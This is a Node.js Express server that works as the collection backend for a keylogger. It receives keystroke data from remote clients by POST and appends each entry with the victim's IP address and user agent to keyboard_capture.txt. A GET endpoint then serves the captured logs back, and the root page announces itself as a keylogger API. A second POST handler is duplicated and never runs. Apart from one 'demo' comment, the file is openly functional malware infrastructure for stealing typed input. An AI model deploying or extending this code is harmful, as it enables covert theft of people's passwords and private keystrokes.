const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();
const cors = require('cors');

app.use(cors());
app.use(bodyParser.json({ extended: true }));

const port = process.env.PORT || 8080;

app.get("/api/logs", (req, res) => {
    try {
        if (!fs.existsSync("./keyboard_capture.txt")) {
            return res.json({ logs: "Chưa có dữ liệu log nào." });
        }
        const kl_file = fs.readFileSync("./keyboard_capture.txt", { encoding: 'utf8', flag: 'r' });
        res.json({ logs: kl_file });
    } catch (error) {
        res.json({ logs: "Chưa có log hoặc lỗi đọc file." });
    }
});

app.get("/", (req, res) => {
    res.send("<h2>Keylogger Backend API is running successfully!</h2>");
});

app.post("/", (req, res) => {
    try {
        // For demo purposes we log the keyboardData sent as part of the body of the POST request to the server.
        console.log(req.body.keyboardData);

        const content = req.body.keyboardData || "";
        if (!content.trim()) {
            return res.status(200).send({ status: "ignored" });
        }

        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'] || "Unknown OS";

        const now = new Date();
        const timeString = now.toLocaleTimeString('vi-VN') + " " + now.toLocaleDateString('vi-VN');

        const logEntry = `[${timeString}] | IP: ${clientIp} | OS/Client: ${userAgent} | Nội dung: ${content}\n`;

        fs.appendFileSync("keyboard_capture.txt", logEntry);
        res.status(200).send("Successfully set the data");
    } catch (error) {
        console.error("Lỗi ghi file:", error);
        res.status(500).send("Error saving data");
    }
});

app.post("/", (req, res) => {
    try {
        const content = req.body.context || "";
        if (!content.trim()) {
            return res.status(200).send({ status: "ignored" });
        }

        const now = new Date();
        const timeString = now.toLocaleTimeString('vi-VN') + " " + now.toLocaleDateString('vi-VN');

        const logEntry = `[${timeString}] ${content}\n`;

        fs.appendFileSync("keyboard_capture.txt", logEntry);
        res.status(200).send("Successfully set the data");
    } catch (error) {
        console.error("Lỗi ghi file:", error);
        res.status(500).send("Error saving data");
    }
});

app.listen(port, () => {
    console.log(`App is listening on port ${port}`);
});
